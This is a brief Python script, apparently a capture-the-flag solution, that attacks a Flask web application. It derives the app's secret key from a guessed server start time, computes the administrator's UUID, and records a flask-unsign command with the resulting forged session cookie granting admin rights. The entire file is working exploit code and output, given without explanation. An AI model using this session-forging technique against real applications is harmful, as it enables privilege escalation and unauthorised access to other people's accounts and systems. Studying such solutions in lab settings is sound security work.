import uuid
import hashlib

server_start_str = "20240921" + "124013" # grab from server
secret_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
print(secret_key)
session_data = {'is_admin': True,'uid': '02ec19dc-bb01-5942-a640-7099cda78081','username': 'administrator'}
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
print(uuid.uuid5(secret, 'administrator'))

'''
flask-unsign --sign -c "{'is_admin': True,'uid': '02ec19dc-bb01-5942-a640-7099cda78081','username': 'administrator'}" --secret 'c688fcaf27db7e078912dd73e501835fff3d1bd890a464ae55a53e3868243043'
eyJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiMDJlYzE5ZGMtYmIwMS01OTQyLWE2NDAtNzA5OWNkYTc4MDgxIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.Zu7ATg.YaZ6PvE4ekDkxrmHqDVPIuc3U9g
'''